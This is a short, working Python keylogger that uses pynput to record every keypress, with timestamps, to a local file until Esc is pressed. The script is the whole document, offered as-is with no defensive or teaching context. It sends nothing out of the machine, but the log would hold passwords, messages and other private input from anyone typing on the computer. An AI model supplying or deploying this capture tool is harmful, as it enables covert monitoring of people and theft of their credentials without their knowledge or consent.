from pynput import keyboard
import logging
import os

# Set up logging to file
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define the function to log keys
def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')  # Log the character pressed
    except AttributeError:
        logging.info(f'Special key {key} pressed')  # Log special keys

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
